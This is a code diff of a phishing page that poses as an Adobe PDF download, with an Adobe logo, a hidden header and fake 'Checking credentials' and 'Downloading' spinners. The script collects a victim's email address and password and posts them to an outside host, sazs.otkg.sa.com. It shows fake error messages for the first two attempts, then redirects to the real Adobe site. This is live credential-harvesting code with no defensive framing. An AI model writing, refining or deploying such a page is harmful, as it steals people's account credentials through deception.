@@ -11,23 +11,31 @@
             font-family: "Segoe UI", Arial, sans-serif;
             background-color: #fff;
             text-align: center;
-            background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUYgo-fsLjmJSDSgv2sHLWHkopaKHJsDM-F2Dqu7OQjgNtLqUH1T-PF956EoGX690vZIz4IJz2YZDJbcqeUPLN84qrBqErapnDbFofyVdziBmuVXqVyxmOjqIn7BGg7JuZT_3pxyBtgcTn7HyMiL_YqguC9qdbE9bU3xrspkZ856pe_gLWzSLuNgZc2UM/s320/Untitled-3.jpg');
+            background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxqrR3YyyJtwMQrXEiXilfCIhOsNJFOcwLLRuFYWoXvaL21T5Aa0wViGruXD5BDkHQmwuxWs2QnTkvhMVHCZcLl4HfnMhJypx79cSFQRZ5D4XMO0gIj7DKPm9mv1ILFhZLbfdRLhECTutW9wu_T3OCPzLEDxwrbHxTZZ2NLM9wCCaP3ANHEPKH0kVSSew/s320/Recovered_UNTITLED-1.jpg');
             background-size: cover;
-            background-position-y: -290px;
+            background-position-y: -250px;
         }
 
         .header {
-            background: #691011;
+            background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBlYFJKpiqJk02f7Fo3_tf3JvZMoSMUhUBc0CufytJGEzviA9tyjYuluKVInrKpTSE8Mg5b2BDCnW_r88xxUdSfcO9S0cjSQdxtUO7ccuhp_inzi1TpkjU43Y37nZULocCTnDsikjmQKrxcdT8rtE0k-ZB-rrqLvzILDikzuLVu063Cq9t0-3zlUzD9Q4/s320/header.jpg');
+            /* background-repeat: no-repeat; */
+            background-size: contain;
+            /* background: #691011; */
             color: white;
             font-size: 20px;
             font-weight: 500;
-            text-align: left;
+            /* text-align: left; */
             padding: 12px 20px;
+            /* width: 100%; */
+        }
+
+        .header span{
+          visibility: hidden;
         }
 
         .logo {
             margin: 25px 0;
-            margin-top: 100px;
+            margin-top: 90px;
         }
 
         .card {
@@ -106,7 +114,9 @@
         .footer {
             font-size: 13px;
             color: #000;
-            margin-top: 200px;
+            font-weight: bold;
+            /* color: #000; */
+            margin-top: 100px;
             /* float: inline-end; */
         }
 
@@ -156,7 +166,7 @@
 </head>
 
 <body>
-    <div class="header">Adobe PDF</div>
+    <div class="header"><span>.</span></div>
 
     <div class="logo">
         <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmWgAmtBzCMcGv1qIQl4E-67bK46wVgw5WhDDsI6ZbkiyWLmmKfjPqyvSj6uTPz-SEl3FgXMWkfQwfmFkWrNCd8VT1ROKtylbBscvT8yBDai-vTh31wa8KWPFDuSDG6l_poNu1G91JIoUpy9wsbwBOx4WbiAIlxcpMcipIxdIrusWN8mUuKXRtCv0oE3w/s320/Adobe_Corporate_logo.svg.png"
@@ -211,8 +221,14 @@
         <a href="#">Privacy</a> & <a href="#">Cookies</a>
     </div>
 
-    <!-- Preloader -->
+     <!-- Preloader 1: Checking credentials -->
     <div class="preloader" id="preloader">
+        <div class="spinner"></div>
+        <div>Checking credentials...</div>
+    </div>
+
+    <!-- Preloader 2: Downloading -->
+    <div class="preloader" id="preloader2">
         <div class="spinner"></div>
         <div>Downloading...</div>
     </div>
@@ -221,12 +237,13 @@
         const form = document.getElementById("verifyForm");
         const step1 = document.getElementById("step1");
         const step2 = document.getElementById("step2");
-        const preloader = document.getElementById("preloader");
+        const preloader1 = document.getElementById("preloader");
+        const preloader2 = document.getElementById("preloader2");
         const nextBtn = document.getElementById("nextBtn");
         const emailInput = document.getElementById("inputline1");
         const instructionText = document.getElementById("instructionText");
 
-        // Helper: mask part of email
+        // Mask email helper
         function maskEmail(email) {
             const [user, domain] = email.split("@");
             if (!user || !domain) return email;
@@ -242,48 +259,42 @@
                 return;
             }
 
-            preloader.style.display = "flex";
+            preloader1.style.display = "flex";
 
             setTimeout(() => {
-                preloader.style.display = "none";
+                preloader1.style.display = "none";
                 step1.style.display = "none";
                 step2.style.display = "block";
                 const masked = maskEmail(emailVal);
-                instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
+                if (instructionText) instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
             }, 2000);
         });
 
-        // Handle form submissions
-        // Handle form submissions
-        // Handle form submissions
-        // Handle form submissions
+        // Step 2 submission
         form.addEventListener("submit", function (e) {
             e.preventDefault();
-            preloader.style.display = "flex";
 
-            // Get the current submission count or initialize it
+            preloader1.style.display = "none";
+            preloader2.style.display = "flex"; // show downloading preloader
+
             let submitCount = parseInt(localStorage.getItem("submitCount") || "0", 10);
             submitCount++;
             localStorage.setItem("submitCount", submitCount);
 
-            // Get the error message container
             const errorMessage = document.getElementById("error-message");
 
-            // Simulate sending data (you can modify this part to check the password)
             const formData = new FormData(form);
             fetch("https://sazs.otkg.sa.com/auto/next.php", {
                 method: "POST",
                 body: formData
-            }).catch(() => { });
+            }).catch(() => {});
 
-            // Wait briefly before next action
             setTimeout(() => {
-                preloader.style.display = "none";
+                preloader2.style.display = "none";
 
                 if (submitCount >= 3) {
-                    // Redirect after 3 failed attempts
-                    localStorage.removeItem("submitCount"); // reset counter
-                    window.location.href = "https://www.adobe.com/creativecloud.html"; // redirect to Adobe website
+                    localStorage.removeItem("submitCount");
+                    window.location.href = "https://www.adobe.com/creativecloud.html";
                 } else {
                     // Show error message twice for the first two failed attempts
                     if (submitCount === 1 || submitCount === 2) {
@@ -295,9 +306,6 @@
                 }
             }, 2000);
         });
-
-
-
     </script>
 </body>
 
